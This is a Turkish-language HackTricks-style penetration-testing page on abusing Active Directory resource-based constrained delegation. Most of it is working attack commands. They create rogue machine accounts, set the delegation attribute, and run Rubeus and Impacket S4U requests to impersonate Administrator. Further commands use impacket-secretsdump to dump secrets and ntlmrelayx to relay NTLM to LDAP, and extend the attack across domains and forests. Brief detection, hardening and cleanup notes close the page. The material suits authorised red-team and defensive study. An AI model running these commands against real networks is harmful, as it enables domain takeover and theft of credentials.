# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation Temelleri

Bu, temel [Constrained Delegation](constrained-delegation.md) ile benzerdir; ancak **bir nesneye**, **bir makineye karşı herhangi bir kullanıcıyı taklit etme** izinleri vermek **yerine**, Resource-based Constrain Delegation, **kendisine karşı herhangi bir kullanıcıyı taklit edebilecek nesneyi** **belirler**.<sup>[[12]](#references)</sup>

Bu durumda, kısıtlanmış nesne, kendisine karşı başka herhangi bir kullanıcıyı taklit edebilecek kullanıcının adını içeren _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ adlı bir attribute'a sahip olur.

Bu Constrained Delegation ile diğer delegation türleri arasındaki bir diğer önemli fark, **bir makine hesabı üzerinde yazma izinlerine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) sahip herhangi bir kullanıcının **_msDS-AllowedToActOnBehalfOfOtherIdentity_** değerini ayarlayabilmesidir (diğer Delegation türlerinde domain admin yetkilerine ihtiyacınız vardı).<sup>[[1]](#references)</sup>

### New Concepts

Constrained Delegation bölümünde, kullanıcının _userAccountControl_ değerindeki **`TrustedToAuthForDelegation`** flag'inin bir **S4U2Self** gerçekleştirmek için gerekli olduğu belirtilmişti. Ancak bu tamamen doğru değildir.\
Gerçekte, bu değer olmadan da **service** iseniz (bir SPN'iniz varsa) herhangi bir kullanıcıya karşı **S4U2Self** gerçekleştirebilirsiniz; ancak **`TrustedToAuthForDelegation`** değerine **sahipseniz**, döndürülen TGS **Forwardable** olur ve bu flag'e **sahip değilseniz**, döndürülen TGS **Forwardable** **olmaz**.<sup>[[5]](#references)</sup>

Ancak **S4U2Proxy** içinde kullanılan **TGS** **Forwardable** **değilse**, bir **basic Constrain Delegation**'ı abuse etmeye çalışmak **çalışmaz**. Fakat bir **Resource-Based constrain delegation** exploit etmeye çalışıyorsanız bu **çalışır**.<sup>[[1]](#references)[[2]](#references)</sup>

### Attack structure

> Bir **Computer** hesabı üzerinde **write equivalent privileges** sahibiyseniz, o makinede **privileged access** elde edebilirsiniz.

Saldırganın kurban bilgisayar üzerinde zaten **write equivalent privileges** sahibi olduğunu varsayalım.

1. Saldırgan, **SPN** sahibi bir hesabı ele geçirir veya **bir tane oluşturur** (“Service A”). Herhangi bir ek özel yetkiye sahip olmayan herhangi bir _Admin User_'ın **10 adede kadar Computer nesnesi** (**_MachineAccountQuota_**) oluşturabileceğini ve bunlara bir **SPN** atayabileceğini unutmayın. Bu nedenle saldırgan yalnızca bir Computer nesnesi oluşturup bir SPN atayabilir.
2. Saldırgan, ServiceA'nın kurban bilgisayara (ServiceB) karşı herhangi bir kullanıcıyı taklit etmesine izin verecek şekilde **resource-based constrained delegation** yapılandırmak için kurban bilgisayar (ServiceB) üzerindeki WRITE yetkisini **abuse eder**.
3. Saldırgan, Service B'den Service A'ya, Service B'ye **privileged access** sahibi bir kullanıcı için **full S4U attack** (S4U2Self ve S4U2Proxy) gerçekleştirmek üzere Rubeus kullanır.
1. S4U2Self (ele geçirilmiş/oluşturulmuş SPN hesabından): **Administrator'ın bana ait bir TGS'ini** ister (Not Forwardable).
2. S4U2Proxy: Önceki adımda elde edilen **not Forwardable TGS**'i kullanarak **Administrator'dan** **victim host**'a bir **TGS** ister.
3. Forwardable olmayan bir TGS kullanıyor olsanız bile, Resource-based constrained delegation exploit ettiğiniz için bu çalışır.
4. Saldırgan **pass-the-ticket** gerçekleştirebilir ve **victim ServiceB**'ye **access** kazanmak için kullanıcıyı **impersonate** edebilir.<sup>[[1]](#references)</sup>

Domain'ın _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Saldırı

### Bilgisayar Nesnesi Oluşturma

Domain içinde **[powermad](https://github.com/Kevin-Robertson/Powermad)** kullanarak bir bilgisayar nesnesi oluşturabilirsiniz:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Resource-based Constrained Delegation Yapılandırma

**activedirectory PowerShell module kullanarak**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview Kullanarak**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Tam bir S4U saldırısı gerçekleştirme (Windows/Rubeus)

Öncelikle `123456` parolasıyla yeni bir Computer object oluşturduk; bu nedenle bu parolanın hash değerine ihtiyacımız var:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Bu, söz konusu hesap için RC4 ve AES hash'lerini yazdırır.\
Artık saldırı gerçekleştirilebilir:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus'un `/altservice` parametresini kullanarak tek bir istekle daha fazla service için daha fazla ticket oluşturabilirsiniz:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Kullanıcıların "**Cannot be delegated**" adlı bir özniteliğe sahip olduğunu unutmayın. Bir kullanıcıda bu öznitelik True olarak ayarlanmışsa, o kullanıcıyı taklit edemezsiniz. Bu özellik bloodhound içinde görülebilir.

### Linux araçları: Impacket ile uçtan uca RBCD (2024+)

Linux üzerinden çalışıyorsanız, resmi Impacket araçlarını kullanarak tüm RBCD zincirini gerçekleştirebilirsiniz:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notlar
- LDAP signing/LDAPS zorunluysa `impacket-rbcd -use-ldaps ...` kullanın.
- AES anahtarlarını tercih edin; birçok modern domain RC4'ü kısıtlar. Impacket ve Rubeus, yalnızca AES kullanan akışları destekler.
- Impacket bazı araçlar için `sname` ("AnySPN") değerini yeniden yazabilir, ancak mümkün olduğunda doğru SPN'yi edinin (ör. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Cross-domain & cross-forest RBCD

Kontrol ettiğiniz **delegating principal**, **resource computer** ile **farklı bir domain'de** (hatta **farklı bir forest'ta**) bulunuyorsa abuse hâlâ **RBCD**'dir, ancak ticket akışı artık alışılagelmiş tek-domain `S4U2Self -> S4U2Proxy` akışı değildir.

### Cross-domain RBCD: foreign principal'ı SID ile yapılandırma

`msDS-AllowedToActOnBehalfOfOtherIdentity` değerini **farklı bir domain'den** ayarladığınızda, foreign machine/user target domain LDAP içinde **name** ile çözümlenemeyebilir. Bu durumda delegation entry'sini foreign principal'ın sAMAccountName/UPN'si yerine **SID**'sini kullanarak yapılandırın.

Bu, NTLM'yi LDAP'a `ntlmrelayx.py` ile relay ederken özellikle önemlidir:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notlar:
- `--sid`, `ntlmrelayx.py` aracına `--escalate-user` değerini bir SID olarak ele almasını söyler; delegating account hedef domain'e foreign olduğunda bu gereklidir.
- Araç `User not found in LDAP` çıktısını verse bile delegation write işlemi başarılı olabilir; çünkü security descriptor foreign SID'yi doğrudan depolar.

### Cross-domain RBCD: cross-realm S4U sequence

Foreign principal `msDS-AllowedToActOnBehalfOfOtherIdentity` içine eklendikten sonra çalışan cross-domain akışı şöyledir:<sup>[[9]](#references)[[13]](#references)</sup>

1. Delegating principal için kendi domain'inden bir **TGT** alın.
2. `krbtgt/<target-domain>` için bir **referral TGT** isteyin.
3. Target-domain DC üzerinde impersonated user için bir **cross-realm S4U2Self referral** isteyin.
4. Bu user için gerçek **S4U2Self** ticket'ını delegator domain'inde yeniden isteyin.
5. Delegator domain'inde **S4U2Proxy** gerçekleştirerek target domain için bir referral ticket alın.
6. `cifs/host.target`, `host/host.target` vb. için service ticket almak üzere target-domain DC üzerinde son **S4U2Proxy** işlemini gerçekleştirin.

Stock Linux tooling'in cross-domain RBCD'de sıklıkla başarısız olmasının nedeni budur:<sup>[[9]](#references)</sup>
- request **realm** değeri, `TGS-REQ` içinde kullanılan TGT'nin realm değerinden farklı olmak zorunda olabilir
- chain, yalnızca **S4U2Self** veya hemen ardından tek bir **S4U2Proxy** gelen **S4U2Self** değil, **independent S4U2Proxy steps** gerektirir

### Cross-domain RBCD from Linux

Synacktiv, iki KDC'yi açıkça ele alarak cross-realm sequence'ı Linux üzerinden yeniden oluşturan bir Impacket `getST.py` implementation yayımladı:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operasyonel olarak yeni argümanlar şunlardır:
- `-dc-ip`: **delegasyon yapan** domain'in DC'si
- `-targetdomain`: **resource computer**'ın domain'i
- `-targetdc`: **resource** domain'in DC'si

### Forestler arası RBCD sınırlamaları

Forestler arası RBCD'nin önemli bir sınırlaması vardır: **taklit edilen kullanıcı, delegasyon yapan principal ile aynı forest'a ait olmalıdır**. Başka bir deyişle, kontrolünüzdeki machine account `valhalla.local` içindeyse ve hedef resource `asgard.local` içindeyse, RBCD aracılığıyla bu resource üzerinde rastgele **`asgard.local` kullanıcılarını** genellikle **impersonate** edemezsiniz.<sup>[[9]](#references)</sup>

Şu durumlarda hâlâ exploit edilebilir:
- **delegasyon yapan forest** kullanıcısı, diğer forest'taki resource host üzerinde **local admin** (veya başka şekilde privileged) ise
- Bir trust, gerekli authentication path'e izin veriyorsa ve foreign SID, hedef computer'ın security descriptor'ında kabul ediliyorsa

### Forestler arası RBCD protocol ayrıntıları

Forestler arası RBCD yalnızca "cross-domain plus a trust" değildir. Gözlemlenen flow, yaygın tooling'in geçmişte gözden kaçırdığı iki ayrıntı içerir:<sup>[[9]](#references)</sup>

1. `PA-PAC-OPTIONS=branch-aware` ayarlayan ek bir **S4U2Proxy** request'i
2. Diğer etypes istenmiş olsa bile **RC4** kullanılarak döndürülebilen nihai service ticket

Pratik flow şöyledir:

1. Forest A'daki delegasyon yapan principal için bir TGT alın.
2. Forest A'daki impersonate edilecek kullanıcı için **S4U2Self** request'i gönderin.
3. Forest A'da, forest B için bir referral TGT almak üzere **S4U2Proxy** request'i gönderin.
4. Forest A'da, S4U2Self ticket'ını additional ticket olarak göndermeden, ancak `branch-aware` etkin olacak şekilde ikinci bir **S4U2Proxy** göndererek forest B için başka bir referral TGT alın.
5. İsteğe bağlı olarak forest B'de delegasyon yapan principal için normal bir service ticket isteyin (bu ticket nihai abuse için gerekli değildir).
6. Forest B'de, impersonate edilen forest-A kullanıcısı için hedef SPN'ye yönelik nihai **S4U2Proxy** ticket'ını istemek üzere 3. ve 4. adımlardaki referral ticket'larını kullanın.

### Linux'tan forestler arası RBCD

Aynı Synacktiv Impacket branch'i bu logic için bir `-forest` switch'i ekler:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (3+ domains)

**multi-domain forest** ortamlarında hem **S4U2Self** hem de **S4U2Proxy**, tek bir referral sonrasında durmak yerine **recursive** olabilir:

- **Recursive S4U2Self**: ilk `S4U2Self`, **impersonate edilen kullanıcının domain'ine** gönderilir; ara parent/child geçişleri, `krbtgt/<REALM>` için normal `TGS-REQ` referral'ları ile gerçekleştirilir ve **son `S4U2Self`**, **delegating principal'ın kendi domain'inde** gönderilir.
- Bu, bir machine account için yalnızca bir **TGT** bulundurmanın bile aynı forest içindeki başka bir domain'den bir **admin** kullanıcısını impersonate etmeye ve `cifs/host`, `host/host`, `wsman/host` vb. istemeye yeterli olabileceği anlamına gelir.
- **Recursive S4U2Proxy** de trust chain'i aynı şekilde takip eder: ara geçişlerde, sonraki `krbtgt/<REALM>` referral'ı istenirken önceki ticket TGT olarak yeniden kullanılır ve yalnızca son hop final service ticket'ını döndürür.<sup>[[10]](#references)</sup>

Pratik bir same-forest örneği:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

**Delegating principal bir SPN'e sahip olmayan bir user ise**, son recursive `S4U2Self` işlemi **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** hatasıyla başarısız olur. Geçici çözüm, yalnızca son hop'u **`S4U2Self+U2U`** olarak yeniden denemektir.<sup>[[10]](#references)</sup>

Abuse chain'in kısa özeti:

1. KDC'yi **RC4-HMAC (etype 23)** kullanmaya yönlendirmek için **NT hash** ile authenticate olun.
2. Önce **`-self -u2u`** isteğinde bulunun ve bu ticket'ı sonraki proxy adımından ayrı tutun.
3. `describeTicket.py` ile **TGT session key**'i çıkarın.
4. `changepasswd.py -newhashes <session_key>` kullanarak user's **NT hash**'ini bu **session key** ile değiştirin.
5. `S4U2Self+U2U` ticket'ını ayrı bir **`-proxy`** isteği sırasında **`-additional-ticket`** olarak yeniden kullanın.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Operational caveats:

- **İlk trusted hop zaten başka bir forest ise**, native Windows davranışını eşleştirmek için **branch-aware** algoritmasını (`getST.py ... -forest`) tercih edin. Yabancı forest zincirde yalnızca **daha sonra** ulaşılıyorsa, branch-aware olmayan recursive flow yine de çalışabilir.<sup>[[9]](#references)</sup>
- Güncel **Windows Server 2022/2025** DC'lerinde, RC4 kullanımı RC4'ün kullanımdan kaldırılması nedeniyle **`KDC_ERR_ETYPE_NOSUPP`** hatasıyla başarısız olabilir; bu durum, klasik SPN-backed RBCD AES ile hâlâ çalışsa bile **SPN-less RBCD**'yi imkânsız hâle getirebilir.<sup>[[15]](#references)</sup>
- Kullanıcının hash/password değerini değiştirmeden önce **`S4U2Self+U2U`** çalıştırın: `SamrChangePasswordUser`, hesabın Kerberos AES anahtarlarını yeniden hesaplamaz. Bu nedenle password değişikliğini önce yapmak, sonraki ticket isteklerini bozabilir.<sup>[[14]](#references)</sup>
- Impersonate edilen hesap hâlâ **delegable** olmalıdır: **Protected Users** ve **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** işaretli hesaplar zinciri engeller.

## Detection / hardening notes

- Domain/forest'ler arasındaki RBCD yolları genellikle hâlâ **ACL abuse** veya **relay-to-LDAP** üzerinden oluşturulur. Yaygın kurulum yollarını engellemek için DC'lerde **LDAP signing** ve **LDAP channel binding** uygulayın.
- Computer object'leri üzerinde `msDS-AllowedToActOnBehalfOfOtherIdentity` yazma yetkisine sahip olanları denetleyin ve **foreign security principals** dâhil olmak üzere kaydedilmiş SID'leri çözümleyin.
- Trust ağırlıklı ortamlarda **Selective Authentication**, **SID filtering** ve yabancı bir forest'teki kullanıcıların resource host'lar üzerinde **local admin** haklarına sahip olup olmadığını inceleyin.

### Accessing

Son command line, **complete S4U attack** işlemini gerçekleştirecek ve Administrator'dan victim host'a alınan **TGS**'yi **memory** içine inject edecektir.\
Bu örnekte Administrator'dan **CIFS** service'i için bir TGS istendi; dolayısıyla **C$**'a erişebileceksiniz:
```bash
ls \\victim.domain.local\C$
```
### Farklı service ticket'ları kötüye kullanma

[**Mevcut service ticket'lar hakkında buradan bilgi edinin**](silver-ticket.md#available-services).

## Enumerasyon, denetim ve temizlik

### RBCD yapılandırılmış bilgisayarları enumerate etme

PowerShell (SID'leri çözümlemek için SD'nin kodunu çözme):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (tek komutla okuma veya temizleme):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### RBCD temizleme / sıfırlama

- PowerShell (attribute'u temizle):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Hataları

- **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, kerberos'un DES veya RC4 kullanmayacak şekilde yapılandırıldığı ve yalnızca RC4 hash'i sağladığınız anlamına gelir. Rubeus'a en az AES256 hash'ini sağlayın (veya rc4, aes128 ve aes256 hash'lerinin tümünü sağlayın). Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- Normal bir kullanıcı için `-self` sırasında **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: delegation yapan principal'ın muhtemelen **SPN'i yoktur**. **Son adımı**, normal bir **`S4U2Self`** yerine **`S4U2Self+U2U`** olarak yeniden deneyin.<sup>[[10]](#references)</sup>
- **SPN'siz RBCD** sırasında **`KDC_ERR_ETYPE_NOSUPP`**: Güncel DC'ler, **`S4U2Self+U2U`** + session-key-substitution tekniği tarafından gerekli kılınan zorunlu **RC4-HMAC** yolunu reddedebilir. Bunun yerine AES kullanan klasik **SPN-backed** RBCD yolunu deneyin.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın saatinin DC'nin saatinden farklı olduğu ve kerberos'un düzgün çalışmadığı anlamına gelir.
- **`preauth_failed`**: Bu, verilen kullanıcı adı + hash'lerin oturum açmak için çalışmadığı anlamına gelir. Hash'leri oluştururken kullanıcı adının içine "$" işaretini koymayı unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Bunun anlamı şu olabilir:
- Impersonate etmeye çalıştığınız kullanıcı istenen servise erişemiyor olabilir (çünkü onu impersonate edemezsiniz veya yeterli ayrıcalıklara sahip değildir)
- İstenen servis mevcut olmayabilir (winrm için ticket istiyorsanız ancak winrm çalışmıyorsa)
- Oluşturulan fakecomputer, savunmasız sunucu üzerindeki ayrıcalıklarını kaybetmiş olabilir ve bu ayrıcalıkları geri vermeniz gerekebilir.
- Klasik KCD'yi abuse ediyor olabilirsiniz; RBCD'nin forwardable olmayan S4U2Self ticket'larıyla çalıştığını, KCD'nin ise forwardable gerektirdiğini unutmayın.

## Notlar, relay'ler ve alternatifler

- LDAP filtrelenmişse RBCD SD'sini AD Web Services (ADWS) üzerinden de yazabilirsiniz. Bkz.:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chain'leri, tek adımda local SYSTEM elde etmek için sıklıkla RBCD ile sonlanır. Uçtan uca pratik örnekler için bkz.:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding **devre dışıysa** ve bir machine account oluşturabiliyorsanız, **KrbRelayUp** gibi araçlar zorlanmış bir Kerberos authentication'ını LDAP'a relay edebilir, hedef bilgisayar nesnesi üzerindeki machine account'unuz için `msDS-AllowedToActOnBehalfOfOtherIdentity` değerini ayarlayabilir ve off-host üzerinden S4U aracılığıyla hemen **Administrator** impersonate edebilir.<sup>[[8]](#references)</sup>

## Referanslar

- [1] [Wagging the Dog: Active Directory'ye Saldırmak İçin Resource-Based Constrained Delegation Abuse](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Delegation Hakkında Başka Bir Söz](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Resource-Based Constrained Delegation Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (resmi)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Güncel syntax ile hızlı Linux cheatsheet'i](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing kapalı → Kerberos relay ile RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - cross-domain ve cross-forest RBCD'yi inceleme](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - cross-domain ve cross-forest RBCD'yi inceleme: 2. bölüm](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation'a genel bakış](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Kerberos'ta RC4 kullanımını tespit etme ve düzeltme](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
